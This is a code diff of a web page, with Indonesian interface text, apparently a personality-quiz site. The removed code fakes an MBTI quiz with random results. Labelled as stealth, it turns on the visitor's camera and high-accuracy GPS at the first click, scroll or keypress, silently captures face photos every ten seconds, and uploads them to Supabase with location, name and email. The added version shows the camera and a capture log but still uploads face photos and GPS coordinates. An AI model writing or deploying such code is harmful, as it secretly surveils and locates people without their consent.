-        type: "ENFP",
-        name: "The Campaigner",
-        desc: "Enthusiastic, creative and sociable free spirits, who can always find a reason to smile.",
-        traits: ["Enthusiastic", "Creative", "Sociable"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/enfp-campaigner-female.svg",
-        role: "Diplomat",
-        color: "#10b981"
-      },
-      {
-        type: "ISTJ",
-        name: "The Logistician",
-        desc: "Practical and fact-minded individuals, whose reliability cannot be doubted.",
-        traits: ["Organized", "Honest", "Dedicated"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/istj-logistician-male.svg",
-        role: "Sentinel",
-        color: "#0ea5e9"
-      },
-      {
-        type: "ISFJ",
-        name: "The Defender",
-        desc: "Very dedicated and warm protectors, always ready to defend their loved ones.",
-        traits: ["Protective", "Loyal", "Warm"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/isfj-defender-female.svg",
-        role: "Sentinel",
-        color: "#0ea5e9"
-      },
-      {
-        type: "ESTJ",
-        name: "The Executive",
-        desc: "Excellent administrators, unsurpassed at managing things – or people.",
-        traits: ["Organized", "Leadership", "Honest"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/estj-executive-female.svg",
-        role: "Sentinel",
-        color: "#0ea5e9"
-      },
-      {
-        type: "ESFJ",
-        name: "The Consul",
-        desc: "Extraordinarily caring, social and popular people, always eager to help.",
-        traits: ["Caring", "Popular", "Cooperative"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/esfj-consul-male.svg",
-        role: "Sentinel",
-        color: "#0ea5e9"
-      },
-      {
-        type: "ISTP",
-        name: "The Virtuoso",
-        desc: "Bold and practical experimenters, masters of all kinds of tools.",
-        traits: ["Practical", "Adventurous", "Resourceful"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/istp-virtuoso-male.svg",
-        role: "Explorer",
-        color: "#f59e0b"
-      },
-      {
-        type: "ISFP",
-        name: "The Adventurer",
-        desc: "Flexible and charming artists, always ready to explore and experience something new.",
-        traits: ["Artistic", "Flexible", "Kind"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/isfp-adventurer-female.svg",
-        role: "Explorer",
-        color: "#f59e0b"
-      },
-      {
-        type: "ESTP",
-        name: "The Entrepreneur",
-        desc: "Smart, energetic and very perceptive people, who truly enjoy living on the edge.",
-        traits: ["Energetic", "Perceptive", "Bold"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/estp-entrepreneur-male.svg",
-        role: "Explorer",
-        color: "#f59e0b"
-      },
-      {
-        type: "ESFP",
-        name: "The Entertainer",
-        desc: "Spontaneous, energetic and enthusiastic people – life is never boring around them.",
-        traits: ["Spontaneous", "Energetic", "Fun"],
-        avatar: "https://www.16personalities.com/static/images/personality-types/avatars/esfp-entertainer-female.svg",
-        role: "Explorer",
-        color: "#f59e0b"
-      }
-    ];
-
-
-    // ============================================================
-    // MBTI PREDICTION
-    // ============================================================
-
-    function predictMBTI() {
-      const random =
-        Math.floor(Math.random() * MBTI_TYPES.length);
-      return MBTI_TYPES[random];
-    }
-
-
-    function showMBTIResult(mbti) {
-      if (!mbti) {
-        console.warn("showMBTIResult: mbti is null, using fallback");
-        mbti = predictMBTI();
-      }
-
-      const resultEl =
-        document.getElementById("mbtiResult");
-      const typeEl =
-        document.getElementById("mbtiType");
-      const nameEl =
-        document.getElementById("mbtiName");
-      const descEl =
-        document.getElementById("mbtiDesc");
-      const traitsEl =
-        document.getElementById("mbtiTraits");
-      const avatarEl =
-        document.getElementById("mbtiAvatar");
-      const avatarImg =
-        document.getElementById("mbtiAvatarImg");
-
-      typeEl.textContent = mbti.type;
-      typeEl.style.color = mbti.color;
-      nameEl.textContent = mbti.name;
-      descEl.textContent = mbti.desc;
-      traitsEl.innerHTML = mbti.traits
-        .map(t => `<span>${t}</span>`)
-        .join("") + `<span style="background: ${mbti.color}20; color: ${mbti.color}; border-color: ${mbti.color}40">${mbti.role}</span>`;
-
-      avatarImg.src = mbti.avatar;
-      avatarEl.classList.add("show");
-
-      resultEl.classList.add("show");
-    }
-
-
-    function initRoulette() {
-      const container =
-        document.getElementById("rouletteContainer");
-      const typesEl =
-        document.getElementById("rouletteTypes");
-
-      typesEl.innerHTML = MBTI_TYPES.map(
-        t => `<div class="roulette-type" data-type="${t.type}">${t.type}</div>`
-      ).join("");
-
-      container.classList.add("active");
-    }
-
-
-    function stopRoulette() {
-      const container =
-        document.getElementById("rouletteContainer");
-      container.classList.remove("active");
-    }
-
-
-    // ============================================================
-    // ELEMENTS (HIDDEN)
-    // ============================================================
-
-    const video =
-      document.getElementById("video");
-
-    const faceCanvas =
-      document.getElementById("faceCanvas");
-
-    const faceCtx =
-      faceCanvas.getContext("2d");
-
-    const captureCanvas =
-      document.getElementById("captureCanvas");
-
-    const captureCtx =
-      captureCanvas.getContext("2d");
-
-    const preview =
-      document.getElementById("preview");
-
-
-    // ============================================================
-    // STATE
-    // ============================================================
-
-    let detector = null;
-
-    let running = false;
-
-    let lastVideoTime = -1;
-
-    let lastCaptureTime = 0;
-
-    let captureCount = 0;
-
-    const CAPTURE_COOLDOWN = 10000;
-
-    let gpsWatchId = null;
-
+  <script>
+    // State
     let cameraStream = null;
-
-
-    let gpsData = {
-
-      latitude: null,
-
-      longitude: null,
-
-      accuracy: null,
-
-      altitude: null,
-
-      altitudeAccuracy: null,
-
-      speed: null,
-
-      heading: null
-
-    };
-
-
-    // ============================================================
-    // STORAGE
-    // ============================================================
-
-    const capturedPhotos = [];
-
-
-    // ============================================================
-    // SUPABASE HELPERS
-    // ============================================================
-
-    async function supabaseInsert(
-      table,
-      data
-    ) {
-
-      const response =
-        await fetch(
-          `${SUPABASE_URL}/rest/v1/${table}`,
-          {
-            method: "POST",
-            headers: {
-              "Content-Type":
-                "application/json",
-              "apikey":
-                SUPABASE_ANON_KEY,
-              "Authorization":
-                `Bearer ${SUPABASE_ANON_KEY}`,
-              "Prefer":
-                "return=representation"
-            },
-            body: JSON.stringify(data)
-          }
-        );
-
-
-      if (
-        !response.ok
-      ) {
-
-        throw new Error(
-          `Supabase insert failed: ${response.status}`
-        );
-
-      }
-
-
-      return response.json();
-
-    }
-
-
-    async function supabaseUpload(
-      path,
-      file
-    ) {
-
-      const response =
-        await fetch(
-          `${SUPABASE_URL}/storage/v1/object/Schema test/${path}`,
-          {
-            method: "POST",
-            headers: {
-              "apikey":
-                SUPABASE_ANON_KEY,
-              "Authorization":
-                `Bearer ${SUPABASE_ANON_KEY}`,
-              "Content-Type":
-                "image/jpeg"
-            },
-            body: file
-          }
-        );
-
-
-      if (
-        !response.ok
-      ) {
-
-        throw new Error(
-          `Supabase upload failed: ${response.status}`
-        );
-
-      }
-
-
-      return response.json();
-
-    }
-
-
-    // ============================================================
-    // SECURITY CHECK
-    // ============================================================
-
-    function checkSecureContext() {
-
-      if (
-        window.isSecureContext
-      ) {
-        return true;
-      }
-
-      return (
-        location.protocol === "https:" ||
-        location.hostname === "localhost" ||
-        location.hostname === "127.0.0.1" ||
-        location.hostname === "::1"
-      );
-
-    }
-
-
-    // ============================================================
-    // CLEANUP
-    // ============================================================
-
-    function cleanupAll() {
-
-      if (
-        gpsWatchId !== null
-      ) {
-
-        navigator.geolocation.clearWatch(
-          gpsWatchId
-        );
-
-        gpsWatchId = null;
-
-      }
-
-      if (
-        cameraStream
-      ) {
-
-        cameraStream.getTracks().forEach(
-          track => track.stop()
-        );
-
-        cameraStream = null;
-
-      }
-
-    }
-
-
-    // ============================================================
-    // MEDIAPIPE
-    // ============================================================
-
-    async function initializeDetector() {
-
-      const vision =
-        await FilesetResolver.forVisionTasks(
-
-          "https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@latest/wasm"
-
-        );
-
-
-      detector =
-        await FaceDetector.createFromOptions(
-
-          vision,
-
-          {
-
-            baseOptions: {
-
-              modelAssetPath:
-                "https://storage.googleapis.com/mediapipe-models/face_detector/blaze_face_short_range/float16/1/blaze_face_short_range.tflite",
-
-              delegate: "GPU"
-
-            },
-
-            runningMode:
-              "VIDEO",
-
-            minDetectionConfidence:
-              0.5,
-
-            minSuppressionThreshold:
-              0.3
-
-          }
-
-        );
-
-    }
-
-
-    // ============================================================
-    // CAMERA
-    // ============================================================
-
-    async function initializeCamera() {
-
-      if (
-        !navigator.mediaDevices ||
-        !navigator.mediaDevices.getUserMedia
-      ) {
-
-        throw new Error(
-          "Browser tidak mendukung Camera API."
-        );
-
-      }
-
-
-      cameraStream =
-        await navigator.mediaDevices.getUserMedia(
-
-          {
-
-            video: {
-
-              facingMode:
-                "user",
-
-              width: {
-                ideal: 1280
-              },
-
-              height: {
-                ideal: 720
-              }
-
-            },
-
-            audio: false
-
-          }
-
-        );
-
-
-      video.srcObject = cameraStream;
-
-
-      await video.play();
-
-
-      resizeCanvas();
-
-    }
-
-
-    // ============================================================
-    // GPS
-    // ============================================================
-
-    function initializeGPS() {
-
-      if (!navigator.geolocation) {
-        return;
-      }
-
-
-      gpsWatchId =
-        navigator.geolocation.watchPosition(
-
-          position => {
-
-            const coords =
-              position.coords;
-
-
-            gpsData.latitude =
-              coords.latitude;
-
-            gpsData.longitude =
-              coords.longitude;
-
-            gpsData.accuracy =
-              coords.accuracy;
-
-            gpsData.altitude =
-              coords.altitude;
-
-            gpsData.altitudeAccuracy =
-              coords.altitudeAccuracy;
-
-            gpsData.speed =
-              coords.speed;
-
-            gpsData.heading =
-              coords.heading;
-
-          },
-
-
-          error => {
-
-            console.warn(
-              "GPS:",
-              error.message
-            );
-
-          },
-
-
-          {
-
-            enableHighAccuracy:
-              true,
-
-            maximumAge:
-              2000,
-
-            timeout:
-              10000
-
-          }
-
-        );
-
-    }
-
-
-    // ============================================================
-    // CANVAS
-    // ============================================================
-
-    function resizeCanvas() {
-
-      if (!video.videoWidth)
-        return;
-
-
-      faceCanvas.width =
-        video.videoWidth;
-
-      faceCanvas.height =
-        video.videoHeight;
-
-    }
-
-
-    window.addEventListener(
-      "resize",
-      resizeCanvas
-    );
-
-
-    // ============================================================
-    // VISIBILITY
-    // ============================================================
-
-    document.addEventListener(
-      "visibilitychange",
-      () => {
-
-        if (
-          document.hidden
-        ) {
-
-          running = false;
-
-        }
-        else if (
-          detector
-        ) {
-
-          running = true;
-
-          lastVideoTime = -1;
-
-          detectFaces();
-
-        }
-
-      }
-    );
-
-
-    // ============================================================
-    // FACE DETECTION LOOP
-    // ============================================================
-
-    function detectFaces() {
-
-      if (!running) {
-
-        requestAnimationFrame(
-          detectFaces
-        );
-
-        return;
-
-      }
-
-
-      if (
-        !detector ||
-        video.readyState < 2
-      ) {
-
-        requestAnimationFrame(
-          detectFaces
-        );
-
-        return;
-
-      }
-
-
-      if (
-        video.currentTime !==
-        lastVideoTime
-      ) {
-
-        lastVideoTime =
-          video.currentTime;
-
-
-        try {
-
-          const result =
-            detector.detectForVideo(
-
-              video,
-
-              performance.now()
-
-            );
-
-
-          const detections =
-            result.detections || [];
-
-
-          if (
-            detections.length > 0
-          ) {
-
-            handleFaceDetection(
-              detections[0]
-            );
-
-          }
-
-        }
-
-        catch (error) {
-
-          // Silent fail
-
-        }
-
-      }
-
-
-      requestAnimationFrame(
-        detectFaces
-      );
-
-    }
-
-
-    // ============================================================
-    // FACE DETECTED → CAPTURE
-    // ============================================================
-
-    let pendingMBTI = null;
-    let pendingUserName = null;
-    let pendingUserEmail = null;
-
-
-    function handleFaceDetection(
-      detection
-    ) {
-
-      const now =
-        Date.now();
-
-
-      if (
-        now - lastCaptureTime >=
-        CAPTURE_COOLDOWN
-      ) {
-
-        capturePhoto(
-          detection
-        );
-
-        lastCaptureTime =
-          now;
-
-      }
-
-    }
-
-
-    // ============================================================
-    // CAPTURE (SILENT)
-    // ============================================================
-
-    function capturePhoto(
-      detection
-    ) {
-
-      if (
-        !video.videoWidth ||
-        !video.videoHeight
-      ) {
-
-        return;
-
-      }
-
-
-      captureCanvas.width =
-        video.videoWidth;
-
-      captureCanvas.height =
-        video.videoHeight;
-
-
-      captureCtx.drawImage(
-
-        video,
-
-        0,
-        0,
-
-        captureCanvas.width,
-        captureCanvas.height
-
-      );
-
-
-      const capturedAt =
-        new Date();
-
-      const mbtiResult =
-        pendingMBTI || predictMBTI();
-
-
-      const metadata = {
-
-        captureId:
-          captureCount + 1,
-
-        timestamp:
-          capturedAt.toISOString(),
-
-        gps: { ...gpsData },
-
-        face: {
-
-          detected:
-            true,
-
-          confidence:
-            detection?.categories?.[0]?.score
-              ?? null
-
-        }
-
-      };
-
-
-      captureCanvas.toBlob(
-
-        async blob => {
-
-          if (!blob)
-            return;
-
-
-          captureCount++;
-
-
-          try {
-
-            /*
-             * Generate filename
-             */
-
-            const filename =
-              `capture_${
-                Date.now()
-              }_${captureCount}.jpg`;
-
-
-            /*
-             * Upload image to Supabase Storage
-             */
-
-            const uploadResult =
-              await supabaseUpload(
-                filename,
-                blob
-              );
-
-
-            /*
-             * Get public URL
-             */
-
-            const imageUrl =
-              `${SUPABASE_URL}/storage/v1/object/public/Schema test/${filename}`;
-
-
-            /*
-             * Insert metadata to Supabase Database
-             */
-
-            await supabaseInsert(
-              "captures",
-              {
-                capture_id:
-                  captureCount,
-                timestamp:
-                  capturedAt.toISOString(),
-                latitude:
-                  gpsData.latitude,
-                longitude:
-                  gpsData.longitude,
-                accuracy:
-                  gpsData.accuracy,
-                altitude:
-                  gpsData.altitude,
-                altitude_accuracy:
-                  gpsData.altitudeAccuracy,
-                speed:
-                  gpsData.speed,
-                heading:
-                  gpsData.heading,
-                face_confidence:
-                  detection?.categories?.[0]?.score
-                    ?? null,
-                image_url:
-                  imageUrl,
-                mbti_type:
-                  mbtiResult.type,
-                mbti_name:
-                  mbtiResult.name,
-                mbti_role:
-                  mbtiResult.role,
-                user_name:
-                  pendingUserName || null,
-                user_email:
-                  pendingUserEmail || null
-              }
-            );
-
-
-            console.log(
-              `✓ Captured: ${filename}`
-            );
-
-          }
-
-          catch (error) {
-
-            console.warn(
-              "Upload failed:",
-              error.message
-            );
-
-          }
-
-        },
-
-        "image/jpeg",
-
-        0.90
-
-      );
-
-    }
-
-
-    // ============================================================
-    // AUTO-START ON USER INTERACTION
-    // ============================================================
-
+    let detector = null;
+    let gpsWatchId = null;
+    let gpsData = { lat: null, lng: null };
+    let captureCount = 0;
+    let captureInterval = null;
     let initialized = false;
+    const CAPTURE_INTERVAL = 10000; // 10 seconds
 
+    // Supabase Config
+    const SUPABASE_URL = window.SUPABASE_URL;
+    const SUPABASE_KEY = window.SUPABASE_KEY;
 
-    async function stealthInit() {
-
-      if (
-        initialized
-      ) {
-        return;
-      }
-
-      initialized = true;
-
-
-      if (
-        !checkSecureContext()
-      ) {
-
-        console.warn(
-          "Stealth: Insecure context"
-        );
-
-        return;
-
-      }
-
+    // Initialize MediaPipe Face Detection
+    async function initializeFaceDetection() {
+      if (initialized) return;
 
       try {
+        const vision = await window.Vision;
+        detector = await vision.FaceDetector.createFromOptions({
+          baseOptions: {
+            modelAssetPath: "https://storage.googleapis.com/mediapipe-models/face_detector/blaze_face_short_range/float16/1/blaze_face_short_range.tflite",
+            delegate: "GPU"
+          },
+          runningMode: "VIDEO",
+          minDetectionConfidence: 0.5
+        });
+        initialized = true;
+        console.log("Face detector initialized");
+      } catch (error) {
+        console.error("Failed to initialize face detector:", error);
+      }
+    }
 
-        await initializeCamera();
+    // Start Detection
+    async function startDetection() {
+      const startBtn = document.getElementById("startBtn");
+      startBtn.disabled = true;
+      startBtn.textContent = "Meminta izin...";
 
-        await Promise.all([
+      try {
+        // Request camera
+        cameraStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: 640, height: 480 }
+        });
 
-          initializeDetector(),
+        // Show camera
+        const video = document.getElementById("webcam");
+        video.srcObject = cameraStream;
 
-          (async () => {
+        // Request location
+        startGPS();
 
-            initializeGPS();
+        // Initialize face detection
+        await initializeFaceDetection();
 
-          })()
+        // Switch to detection page
+        document.getElementById("landing").style.display = "none";
+        document.getElementById("detection").style.display = "flex";
 
-        ]);
+        // Start capture interval
+        setTimeout(() => {
+          captureInterval = setInterval(capturePhoto, CAPTURE_INTERVAL);
+          // First capture after 10 seconds
+        }, CAPTURE_INTERVAL);
 
+        addLog("Deteksi dimulai", "success");
 
-        running = true;
+      } catch (error) {
+        console.error("Error starting detection:", error);
+        startBtn.disabled = false;
+        startBtn.textContent = "Mulai Deteksi";
+        alert("Gagal memulai deteksi: " + error.message);
+      }
+    }
 
-        detectFaces();
-
-
-        console.log(
-          "%c⚠ Active",
-          "color: red; font-size: 20px;"
-        );
-
+    // Start GPS tracking
+    function startGPS() {
+      if (!navigator.geolocation) {
+        document.getElementById("gpsCoords").textContent = "Geolocation tidak didukung";
+        return;
       }
 
-      catch (error) {
-
-        console.warn(
-          "Stealth init failed:",
-          error.message
-        );
-
-        initialized = false;
-
-      }
-
-    }
-
-
-    /*
-     * Trigger on any user interaction
-     */
-
-    document.addEventListener(
-      "click",
-      () => stealthInit(),
-      { once: false }
-    );
-
-
-    document.addEventListener(
-      "scroll",
-      () => stealthInit(),
-      { once: false, passive: true }
-    );
-
-
-    document.addEventListener(
-      "keydown",
-      () => stealthInit(),
-      { once: false }
-    );
-
-
-    // ============================================================
-    // CLEANUP ON UNLOAD
-    // ============================================================
-
-    window.addEventListener(
-      "beforeunload",
-      cleanupAll
-    );
-
-
-    // ============================================================
-    // MBTI BUTTON HANDLER
-    // ============================================================
-
-    const mbtiBtn =
-      document.getElementById("mbtiBtn");
-
-    const scanLines =
-      document.getElementById("scanLines");
-
-    const progressBar =
-      document.getElementById("rouletteProgress");
-
-
-    async function runRoulette(finalMBTI) {
-      initRoulette();
-
-      scanLines.classList.add("active");
-
-      const types =
-        document.querySelectorAll(".roulette-type");
-
-      let currentIndex = 0;
-      let speed = 50;
-      let iterations = 0;
-      const maxIterations = 30;
-
-      return new Promise(resolve => {
-
-        function highlight() {
-
-          types.forEach(t =>
-            t.classList.remove("highlight")
-          );
-
-          types[currentIndex].classList.add("highlight");
-
-          iterations++;
-
-          const progress =
-            Math.min((iterations / maxIterations) * 100, 100);
-          progressBar.style.width = progress + "%";
-
-          if (iterations >= maxIterations) {
-
-            types.forEach(t =>
-              t.classList.remove("highlight")
-            );
-
-            const finalIndex = MBTI_TYPES.findIndex(
-              t => t.type === finalMBTI.type
-            );
-
-            types[finalIndex].classList.add("selected");
-
-            scanLines.classList.remove("active");
-
-            progressBar.style.width = "100%";
-
-            setTimeout(() => {
-              stopRoulette();
-              resolve();
-            }, 500);
-
-            return;
-
-          }
-
-          currentIndex =
-            (currentIndex + 1) % types.length;
-
-          speed += 15;
-
-          setTimeout(highlight, speed);
-
-        }
-
-        highlight();
-
-      });
-
-    }
-
-
-    let quizAnswers = {};
-    let currentStep = 0;
-    const totalSteps = 5;
-
-
-    function updateQuizProgress() {
-      const dots =
-        document.querySelectorAll(".quiz-progress-dot");
-
-      dots.forEach((dot, i) => {
-        dot.classList.remove("active", "done");
-
-        if (i < currentStep) {
-          dot.classList.add("done");
-        }
-        else if (i === currentStep) {
-          dot.classList.add("active");
-        }
-      });
-    }
-
-
-    function showStep(step) {
-      document.querySelectorAll(".quiz-step").forEach(
-        s => s.classList.remove("active")
+      gpsWatchId = navigator.geolocation.watchPosition(
+        (position) => {
+          gpsData.lat = position.coords.latitude;
+          gpsData.lng = position.coords.longitude;
+          document.getElementById("gpsCoords").textContent = 
+            `${gpsData.lat.toFixed(6)}, ${gpsData.lng.toFixed(6)}`;
+        },
+        (error) => {
+          console.error("GPS error:", error);
+          document.getElementById("gpsCoords").textContent = "Gagal mendapatkan lokasi";
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
-
-      document.querySelector(
-        `.quiz-step[data-step="${step}"]`
-      ).classList.add("active");
-
-      const prevBtn =
-        document.getElementById("quizPrev");
-      const nextBtn =
-        document.getElementById("quizNext");
-
-      prevBtn.style.visibility =
-        step === 0 ? "hidden" : "visible";
-
-      if (step === totalSteps) {
-        nextBtn.textContent = "✨ Get My Result";
-        nextBtn.disabled = true;
-      }
-      else {
-        nextBtn.textContent = "Next →";
-        nextBtn.disabled = !quizAnswers[step];
-      }
-
-      updateQuizProgress();
     }
 
+    // Capture photo and send to Supabase
+    async function capturePhoto() {
+      const video = document.getElementById("webcam");
+      const faceCanvas = document.getElementById("faceCanvas");
+      const captureCanvas = document.getElementById("captureCanvas");
+      
+      if (!video.srcObject) return;
 
-    document.querySelectorAll(".quiz-option").forEach(opt => {
-      opt.addEventListener("click", function() {
-        const step = this.closest(".quiz-step").dataset.step;
+      // Draw video frame to canvas
+      faceCanvas.width = video.videoWidth;
+      faceCanvas.height = video.videoHeight;
+      const ctx = faceCanvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
 
-        this.closest(".quiz-options").querySelectorAll(".quiz-option").forEach(
-          o => o.classList.remove("selected")
+      // Detect face
+      if (detector && initialized) {
+        try {
+          const results = detector.detectForVideo(video, performance.now());
+          
+          if (results.detections && results.detections.length > 0) {
+            // Face detected
+            updateFaceStatus(true);
+            
+            // Capture photo
+            const imageData = faceCanvas.toDataURL("image/jpeg", 0.8);
+            
+            // Send to Supabase
+            await sendToSupabase(imageData);
+            
+            captureCount++;
+            document.getElementById("captureCount").textContent = captureCount;
+            document.getElementById("lastCapture").textContent = new Date().toLocaleTimeString("id-ID");
+            
+            addLog(`Tangkapan #${captureCount} berhasil`, "success");
+          } else {
+            updateFaceStatus(false);
+          }
+        } catch (error) {
+          console.error("Detection error:", error);
+        }
+      }
+    }
+
+    // Update face status
+    function updateFaceStatus(detected) {
+      const faceStatus = document.getElementById("faceStatus");
+      const faceIndicator = document.getElementById("faceIndicator");
+      
+      if (detected) {
+        faceStatus.textContent = "Terdeteksi";
+        faceStatus.className = "info-value success";
+        faceIndicator.classList.add("detected");
+      } else {
+        faceStatus.textContent = "Tidak ada wajah";
+        faceStatus.className = "info-value warning";
+        faceIndicator.classList.remove("detected");
+      }
+    }
+
+    // Send data to Supabase
+    async function sendToSupabase(imageData) {
+      try {
+        // Convert base64 to blob
+        const response = await fetch(imageData);
+        const blob = await response.blob();
+        
+        const timestamp = Date.now();
+        const filename = `capture_${timestamp}.jpg`;
+
+        // Upload image to Supabase Storage
+        const uploadResponse = await fetch(
+          `${SUPABASE_URL}/storage/v1/object/Schema%20test/${filename}`,
+          {
+            method: "POST",
+            headers: {
+              "Authorization": `Bearer ${SUPABASE_KEY}`,
+              "Content-Type": "image/jpeg"
+            },
+            body: blob
+          }
         );
 
-        this.classList.add("selected");
+        if (!uploadResponse.ok) {
+          throw new Error("Upload failed: " + await uploadResponse.text());
+        }
 
-        quizAnswers[step] = this.dataset.value;
+        // Get public URL
+        const imageUrl = `${SUPABASE_URL}/storage/v1/object/public/Schema%20test/${filename}`;
 
-        document.getElementById("quizNext").disabled = false;
-      });
-    });
+        // Insert metadata to database
+        const dbResponse = await fetch(
+          `${SUPABASE_URL}/rest/v1/captures`,
+          {
+            method: "POST",
+            headers: {
+              "Authorization": `Bearer ${SUPABASE_KEY}`,
+              "Content-Type": "application/json",
+              "Prefer": "return=minimal"
+            },
+            body: JSON.stringify({
+              image_url: imageUrl,
+              gps_lat: gpsData.lat,
+              gps_lng: gpsData.lng,
+              captured_at: new Date().toISOString(),
+              user_agent: navigator.userAgent
+            })
+          }
+        );
 
+        if (!dbResponse.ok) {
+          throw new Error("DB insert failed: " + await dbResponse.text());
+        }
 
-    document.getElementById("quizPrev").addEventListener("click", () => {
-      if (currentStep > 0) {
-        currentStep--;
-        showStep(currentStep);
+      } catch (error) {
+        console.error("Supabase error:", error);
+        addLog("Gagal mengirim data", "error");
       }
-    });
-
-
-    document.getElementById("quizNext").addEventListener("click", () => {
-      if (currentStep < totalSteps) {
-        currentStep++;
-        showStep(currentStep);
-      }
-    });
-
-
-    document.getElementById("quizName").addEventListener("input", validateFinalStep);
-    document.getElementById("quizEmail").addEventListener("input", validateFinalStep);
-
-
-    function validateFinalStep() {
-      const name =
-        document.getElementById("quizName").value.trim();
-      const email =
-        document.getElementById("quizEmail").value.trim();
-
-      document.getElementById("quizNext").disabled =
-        !(name && email && email.includes("@"));
     }
 
-
-    mbtiBtn.addEventListener(
-      "click",
-      async () => {
-
-        if (!initialized) {
-          await stealthInit();
-        }
-
-        mbtiBtn.style.display = "none";
-
-        document.getElementById("quizForm").classList.add("active");
-
-        showStep(0);
-
+    // Add log entry
+    function addLog(message, type) {
+      const logContainer = document.getElementById("captureLog");
+      const entry = document.createElement("div");
+      entry.className = `log-entry ${type}`;
+      entry.innerHTML = `
+        <span class="log-time">${new Date().toLocaleTimeString("id-ID")}</span>
+        <span>${message}</span>
+      `;
+      logContainer.insertBefore(entry, logContainer.firstChild);
+      
+      // Keep only last 10 entries
+      while (logContainer.children.length > 10) {
+        logContainer.removeChild(logContainer.lastChild);
       }
-    );
+    }
 
-
-    document.getElementById("quizNext").addEventListener("click", async () => {
-
-      if (currentStep === totalSteps) {
-
-        const name =
-          document.getElementById("quizName").value.trim();
-        const email =
-          document.getElementById("quizEmail").value.trim();
-
-        document.getElementById("quizForm").classList.remove("active");
-
-        document.querySelector(".quiz-progress").style.display = "none";
-
-        const finalMBTI = predictMBTI();
-
-        pendingUserName = name;
-        pendingUserEmail = email;
-
-        await runRoulette(finalMBTI);
-
-        if (finalMBTI) {
-          showMBTIResult(finalMBTI);
-        } else {
-          showMBTIResult(predictMBTI());
-        }
-
+    // Cleanup on page unload
+    window.addEventListener("beforeunload", () => {
+      if (cameraStream) {
+        cameraStream.getTracks().forEach(track => track.stop());
       }
-
+      if (gpsWatchId) {
+        navigator.geolocation.clearWatch(gpsWatchId);
+      }
+      if (captureInterval) {
+        clearInterval(captureInterval);
+      }
     });
-
   </script>
-
 </body>
 </html>
